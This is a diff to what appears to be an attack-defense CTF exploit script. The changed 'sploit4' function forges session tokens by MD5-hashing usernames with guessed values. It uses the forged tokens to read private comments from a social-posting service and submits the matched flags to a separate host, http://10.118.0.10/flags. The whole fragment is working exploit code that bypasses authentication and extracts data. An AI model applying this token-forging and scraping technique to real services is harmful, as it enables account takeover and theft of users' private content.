@@ -80,21 +80,27 @@ def sploit4(hostname: str) -> list:
     flags = []
     tokens = []
     bark_ids = []
-    for page_n in range(0, 1):
-        users_list = api.api_get_users(token, page_n)
-        for user in users_list:
-            for generation in generations:
-                token = hashlib.md5(f"{user}{generation}".encode()).hexdigest()
-                r = api.api_index(token)
-                if r:
-                    print(token)
-                    tokens.append(token)
+    page_n = 0
 
-        barks_list = api.api_get_last_barks(token, page_n)
-        for bark in barks_list:
-            bark_ids.append(bark["id"])
-    print(tokens)
-    print(bark_ids)
+    barks_list = api.api_get_last_barks(token, page_n)
+    for bark in barks_list:
+        bark_ids.append(bark["id"])
+
+    users_list = api.api_get_users(token, page_n)
+    for user in users_list:
+        for generation in generations:
+            token = hashlib.md5(f"{user['username']}{generation}".encode()).hexdigest()
+            r = api.api_index(token)
+            if r:
+                print(token)
+                for bark_id in bark_ids:
+                    comments = api.api_comments(token, bark_id)
+                    flags += [comment["text"] for comment in comments if comment["is_private"] and FLAG_REGEXP.match(comment["text"])]
+                print(flags)
+                requests.put("http://10.118.0.10/flags", headers={"X-Team-Token": TOKEN}, json=flags)
+                break        
+            
+
     return flags
 
 HOSTNAME = sys.argv[1]
